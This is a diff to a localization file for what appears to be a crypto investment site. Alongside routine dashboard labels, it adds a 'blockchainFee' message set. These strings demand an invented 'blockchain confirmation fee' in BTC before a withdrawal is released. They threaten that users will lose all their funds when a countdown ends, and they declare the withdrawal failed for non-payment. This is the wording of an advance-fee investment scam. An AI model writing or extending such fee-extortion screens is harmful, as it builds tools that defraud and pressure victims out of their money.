@@ -102,6 +102,10 @@
     "totalBalance": "Total Balance",
     "activeInvestments": "Active Investments",
     "totalProfit": "Total Profit",
+    "totalInvested": "Total Invested",
+    "recentTransactions": "Recent Transactions",
+    "noTransactions": "No recent transactions",
+    "kycStatus": "KYC Status",
     "menu": {
       "dashboard": "Dashboard",
       "investments": "Investments",
@@ -111,6 +115,19 @@
       "referrals": "Referrals",
       "profile": "Profile & KYC"
     }
+  },
+  "blockchainFee": {
+    "urgentTitle": "URGENT: Blockchain Confirmation Required",
+    "paymentRequired": "Payment of ${{amount}} Required",
+    "description": "Your withdrawal requires a blockchain confirmation fee. Failure to pay within the time limit will result in the loss of your funds.",
+    "sendTo": "Send BTC to this address:",
+    "equivalentBtc": "(equivalent in BTC at current rate)",
+    "warning": "WARNING: If payment is not received within the countdown, you will lose ALL your funds!",
+    "payNow": "Pay ${{amount}} Now",
+    "singleTransaction": "Payment must be made in a single transaction",
+    "failed": "Transaction Failed",
+    "failedDescription": "Your withdrawal has failed due to non-payment of the blockchain confirmation fee. Please contact support.",
+    "addressCopied": "Wallet address copied to clipboard"
   },
   "auth": {
     "signIn": "Sign In",
